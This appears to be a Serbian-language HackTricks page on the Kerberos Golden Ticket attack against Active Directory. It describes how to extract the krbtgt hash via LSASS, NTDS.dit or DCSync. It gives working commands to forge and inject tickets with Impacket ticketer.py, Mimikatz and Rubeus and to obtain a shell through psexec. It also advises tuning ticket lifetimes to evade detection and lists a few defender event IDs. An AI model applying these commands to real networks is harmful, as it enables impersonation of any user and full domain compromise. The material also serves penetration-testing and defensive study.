# Zlatna karta

{{#include ../../banners/hacktricks-training.md}}

## Zlatna karta

Napad **Zlatna karta** se sastoji od **kreiranja legitimne Ticket Granting Ticket (TGT) imitujući bilo kog korisnika** korišćenjem **NTLM heša Active Directory (AD) krbtgt naloga**. Ova tehnika je posebno korisna jer **omogućava pristup bilo kojoj usluzi ili mašini** unutar domena kao imitirani korisnik. Važno je zapamtiti da se **akreditivi krbtgt naloga nikada automatski ne ažuriraju**.

Da bi se **dobio NTLM heš** krbtgt naloga, mogu se koristiti različite metode. Može se izvući iz **Local Security Authority Subsystem Service (LSASS) procesa** ili iz **NT Directory Services (NTDS.dit) datoteke** koja se nalazi na bilo kom Domain Controller (DC) unutar domena. Pored toga, **izvođenje DCsync napada** je još jedna strategija za dobijanje ovog NTLM heša, koja se može izvesti korišćenjem alata kao što su **lsadump::dcsync modul** u Mimikatz ili **secretsdump.py skripta** od Impacket. Važno je naglasiti da za izvođenje ovih operacija, **obično su potrebne privilegije domen admina ili sličan nivo pristupa**.

Iako NTLM heš služi kao izvodljiva metoda za ovu svrhu, **snažno se preporučuje** da se **falsifikuju karte koristeći Advanced Encryption Standard (AES) Kerberos ključeve (AES128 i AES256)** iz razloga operativne sigurnosti.
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
**Kada** imate **injektovani zlatni tiket**, možete pristupiti deljenim datotekama **(C$)**, i izvršavati usluge i WMI, tako da možete koristiti **psexec** ili **wmiexec** da dobijete shell (izgleda da ne možete dobiti shell putem winrm).

### Zaobilaženje uobičajenih detekcija

Najčešći načini za detekciju zlatnog tiketa su **inspekcija Kerberos saobraćaja** na mreži. Po defaultu, Mimikatz **potpisuje TGT na 10 godina**, što će se istaknuti kao anomalija u narednim TGS zahtevima napravljenim sa njim.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Koristite parametre `/startoffset`, `/endin` i `/renewmax` da kontrolišete početni offset, trajanje i maksimalne obnavljanja (sve u minutima).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Nažalost, trajanje TGT-a nije zabeleženo u 4769, tako da ovu informaciju nećete pronaći u Windows dnevnicima događaja. Međutim, ono što možete korelirati je **videti 4769 bez prethodnog 4768**. **Nije moguće zatražiti TGS bez TGT-a**, i ako ne postoji zapis o izdatom TGT-u, možemo zaključiti da je falsifikovan offline.

Da biste **zaobišli ovu detekciju**, proverite dijamantske karte:

{{#ref}}
diamond-ticket.md
{{#endref}}

### Ublažavanje

- 4624: Prijava na nalog
- 4672: Prijava administratora
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Ostale male trikove koje odbrambeni tim može da uradi je **alarmirati na 4769 za osetljive korisnike** kao što je podrazumevani nalog administratora domena.

## Reference

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

{{#include ../../banners/hacktricks-training.md}}
